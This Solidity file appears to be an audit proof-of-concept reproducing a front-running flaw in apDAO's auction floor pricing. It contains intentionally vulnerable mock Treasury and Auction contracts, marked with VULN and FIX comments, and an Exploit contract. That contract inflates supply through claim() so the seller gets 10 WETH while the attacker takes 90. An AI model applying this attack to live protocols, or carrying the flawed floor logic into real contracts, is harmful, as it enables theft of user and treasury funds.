// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  apDAO auction floor — C-01 (Pashov, 2024-10-03)
    createAuction reads treasury.realFloorValue(), which is
    (backing + backingLoanedOut) / float. claim() mints remainingClaimable
    and raises float without new backing. Frontrunning creation with a claim
    of 9 drops the floor from 100 WETH to 10. Settlement pays the NFT owner
    10. The attacker then redeems the 9 claimed NFTs for the remaining 90.

    Verbatim: currentRFV = treasury.realFloorValue();
              value_ = (backing_ + backingLoanedOut_) / float_;
              _mint(msg.sender, remainingClaimable);
*/

contract WETH {
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Treasury {
    WETH public weth;
    uint256 public floatSupply = 1; // the listed NFT is already circulating
    mapping(address => uint256) public claimable;
    mapping(address => uint256) public nftOf;

    constructor(WETH _weth) {
        weth = _weth;
    }

    function setClaimable(address user, uint256 amount) external {
        claimable[user] = amount;
    }

    function realFloorValue() public view returns (uint256) {
        uint256 backing_ = weth.balanceOf(address(this));
        uint256 backingLoanedOut_ = 0;
        uint256 float_ = floatSupply;
        uint256 value_ = (backing_ + backingLoanedOut_) / float_; // @> VULN: float is increasable by claim() with no new backing
        return value_;
    }

    function claim() external {
        uint256 remainingClaimable = claimable[msg.sender];
        claimable[msg.sender] = 0;
        _mint(msg.sender, remainingClaimable); // @> VULN: frontrun mint raises float and cuts the floor
        // FIX: reject claim() while an auction is being priced, or snapshot float first
    }

    function _mint(address to, uint256 amount) internal {
        nftOf[to] += amount;
        floatSupply += amount;
    }

    function redeemItem(uint256) external returns (uint256 redeemedValue) {
        redeemedValue = realFloorValue();
        floatSupply -= 1;
        require(weth.transfer(msg.sender, redeemedValue), "redeem");
    }

    function redeemAll() external returns (uint256 paidOut) {
        uint256 n = nftOf[msg.sender];
        require(n > 0 && n == floatSupply, "float");
        uint256 each = realFloorValue();
        paidOut = each * n;
        nftOf[msg.sender] = 0;
        floatSupply = 0;
        require(weth.transfer(msg.sender, paidOut), "redeemAll");
    }
}

contract Auction {
    Treasury public treasury;
    WETH public weth;
    address public originalOwner;
    uint256 public apdaoId = 1;
    uint256 public listedPrice;
    uint256 public ownerReceived;

    constructor(Treasury _treasury, WETH _weth, address _owner) {
        treasury = _treasury;
        weth = _weth;
        originalOwner = _owner;
    }

    function createAuction() external {
        uint256 currentRFV = treasury.realFloorValue(); // @> VULN: list price is the live floor, already diluted by a frontrun claim
        // FIX: use a floor snapshotted before claim() can land in front of this call
        listedPrice = currentRFV;
    }

    function settle() external {
        uint256 redeemedValue = treasury.redeemItem(apdaoId); // pays the depressed floor
        require(weth.transfer(originalOwner, redeemedValue), "owner");
        ownerReceived = redeemedValue;
    }
}

contract OwnerSink {}

contract Exploit {
    WETH public weth; // CREATE nonce 1
    Treasury public treasury; // CREATE nonce 2
    Auction public auction; // CREATE nonce 4 — vulnerable listing (owner is nonce 3)
    OwnerSink public owner; // CREATE nonce 3

    uint256 public fairFloor;

    constructor() {
        weth = new WETH();
        treasury = new Treasury(weth);
        owner = new OwnerSink();
        auction = new Auction(treasury, weth, address(owner));
        weth.mint(address(treasury), 100 ether);
        treasury.setClaimable(address(this), 9);
    }

    function run() external {
        fairFloor = treasury.realFloorValue();
        require(fairFloor == 100 ether, "fair floor 100");
        treasury.claim(); // float 1 -> 10, floor 100 -> 10
        require(treasury.realFloorValue() == 10 ether, "diluted floor");
        auction.createAuction();
        require(auction.listedPrice() == 10 ether, "listed at 10");
        auction.settle();
        require(auction.ownerReceived() == 10 ether, "owner paid 10");
        require(weth.balanceOf(address(owner)) == 10 ether, "owner balance");
        uint256 redeemed = treasury.redeemAll();
        require(redeemed == 90 ether, "attacker redeemed 90");
        require(weth.balanceOf(address(this)) == 90 ether, "attacker balance");
        require(weth.balanceOf(address(treasury)) == 0, "treasury empty");
    }
}
